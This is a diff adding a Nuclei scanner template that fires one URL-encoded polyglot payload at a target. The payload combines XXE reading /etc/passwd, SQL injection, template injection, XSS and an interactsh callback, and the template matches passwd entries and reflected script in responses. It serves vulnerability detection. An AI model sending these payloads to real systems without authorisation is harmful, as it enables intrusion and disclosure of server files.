@@ -1,0 +1,32 @@
+id: one_line_checks_nuclei
+
+info:
+  name: one_line_checks_nuclei
+  author: brinhosa
+  severity: medium
+  description: Check for multiple vulnerabilities in one payload.
+  reference:
+    - https://github.com/brinhosa/payloads
+  tags: xss,sqli,xxe,ssti,csti       
+
+
+requests:
+  
+  - method: GET
+    path:
+      - '{{BaseURL}}/?q=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%20%3F%3E%3C%21--%20%27or%201%3D1--%3E%3C%21--%20%22%3E%3C%25%3D71%2A71%25%3E%7B%7B71%2A71%7D%7D%20--%3E%3C%21DOCTYPE%0Atest%20%5B%20%3C%21ENTITY%20x%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3CstockCheck%3E%3CproductId%3E%26x%3B%3C%2FproductId%3E%3CstoreId%3E1%3C%2FstoreId%3E%3C%21%5BCDATA%5B%3Cs%3E%3Csvg%2Fonload%3Dprompt%285%29%3B%3E%26url%3Dhttps%3A%2F%2F%7B%7Binteractsh-url%7D%7D%26b%3D%5D%5D%3E%3C%2FstockCheck%3E'   
+      - '{{BaseURL}}/%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%20%3F%3E%3C%21--%20%27or%201%3D1--%3E%3C%21--%20%22%3E%3C%25%3D71%2A71%25%3E%7B%7B71%2A71%7D%7D%20--%3E%3C%21DOCTYPE%0Atest%20%5B%20%3C%21ENTITY%20x%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3CstockCheck%3E%3CproductId%3E%26x%3B%3C%2FproductId%3E%3CstoreId%3E1%3C%2FstoreId%3E%3C%21%5BCDATA%5B%3Cs%3E%3Csvg%2Fonload%3Dprompt%285%29%3B%3E%26url%3Dhttps%3A%2F%2F%7B%7Binteractsh-url%7D%7D%26b%3D%5D%5D%3E%3C%2FstockCheck%3E%0A'       
+    skip-variables-check: true    
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<svg/onload=prompt(5);>"
+          - "www-data:"
+          - "daemon:"
+          - "user:x"
+          - "5041"   
+          - "mysql"   
+        condition: or
+                  
+ 
